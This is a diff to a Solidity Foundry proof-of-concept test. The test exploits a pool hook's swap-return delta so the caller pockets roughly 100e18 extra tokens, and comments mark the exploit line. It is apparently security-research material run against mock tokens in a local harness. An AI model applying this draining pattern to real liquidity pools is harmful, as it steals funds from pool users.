@@ -46,21 +46,18 @@ contract POC is Test {
             if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
+            // THIS IS THE EXPLOIT - s already includes hook's 100e18
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            // SETTLE using mint, not transfer - this was the bug
             if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();}
+            else if(s.amount0()>0){manager.take(c0, address(this), uint128(s.amount0()));}
             if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
-            if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
-            if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
-            // NOW TAKE HOOK CREDIT - 1e20 = 100e18 per your screenshot
-            manager.take(c0, address(this), 100e18);
+            else if(s.amount1()>0){manager.take(c1, address(this), uint128(s.amount1()));}
         }
         return "";
     }
     function test_afterSwapReturnDelta() public {
-        uint bBefore = token0.balanceOf(address(this));
+        uint b0 = token0.balanceOf(address(this));
         manager.unlock(abi.encode(uint256(2)));
-        uint bAfter = token0.balanceOf(address(this));
-        assertGt(bAfter, bBefore, "you should profit 100e18");
+        assertGt(token0.balanceOf(address(this)), b0);
     }
 }
